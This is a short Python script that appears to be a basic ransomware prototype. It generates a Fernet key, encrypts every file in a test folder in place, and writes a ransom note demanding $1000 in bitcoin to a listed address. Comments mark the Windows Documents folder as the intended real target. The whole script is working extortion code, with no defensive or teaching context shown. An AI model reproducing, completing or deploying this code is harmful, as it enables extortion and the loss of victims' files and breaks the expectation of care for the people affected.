from cryptography.fernet import Fernet
import os
import base64

def generate_key():
    key = base64.urlsafe_b64encode(os.urandom(32))
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

def load():
    return open('key.key', 'rb').read()

def encrypt(files,key):
    fernet = Fernet(key)
    for file in files:
        with open(file, 'rb') as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        with open(file, 'wb') as f:
            f.write(encrypted)


if __name__ == '__main__':
    # code to get the path to the documents folder
    # documents_path = os.path.join(os.environ["USERPROFILE"], "Documents")
    # print(f"Ruta a la carpeta Documents: {documents_path}")
    generate_key()
    key = load()
    path_to_encrypt = './TestFiles' # We should change this to %UserProfile%\Documents.
    files = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt + '/' + file for file in files]

    encrypt(full_path, key)

    with open(path_to_encrypt + '/README.txt', 'w') as f:
        f.write('Your files have been encrypted')
        f.write('\nIf you want to decrypt your files you will need to pay $1000 to the following bitcoin address: 1J9yZa3XazbXbJ6vW8ZL4g5B2Zc3yv7b3A')